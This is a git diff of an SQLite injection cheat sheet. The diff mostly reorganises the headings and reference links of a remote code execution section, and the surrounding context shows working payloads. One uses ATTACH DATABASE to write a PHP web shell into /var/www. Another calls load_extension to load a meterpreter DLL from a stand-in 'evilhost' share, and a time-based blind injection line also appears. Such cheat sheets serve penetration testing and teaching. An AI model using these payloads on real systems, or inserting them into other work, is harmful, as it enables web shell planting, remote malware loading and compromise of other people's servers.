@@ -12,9 +12,12 @@
 * [Boolean - Extract info](#boolean---extract-info)
 * [Boolean - Error based](#boolean---error-based)
 * [Time based](#time-based)
-* [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
-* [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
+* [Remote Code Execution](#remote-code-execution)
+    * [Attach Database](#attach-database)
+    * [Load_extension](#load_extension)
 * [References](#references)
+
+
 ## SQLite comments
 
 ```sql
@@ -98,7 +101,9 @@ AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 ```
 
 
-## Remote Command Execution using SQLite command - Attach Database
+## Remote Code Execution
+
+### Attach Database
 
 ```sql
 ATTACH DATABASE '/var/www/lol.php' AS lol;
@@ -106,7 +111,7 @@ CREATE TABLE lol.pwn (dataz text);
 INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
 ```
 
-## Remote Command Execution using SQLite command - Load_extension
+### Load_extension
 
 ```sql
 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
@@ -114,7 +119,9 @@ UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');
 
 Note: By default this component is disabled
 
+
 ## References
 
-[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
-[SQLite Error Based Injection for Enumeration](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
+* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
+* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
+* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
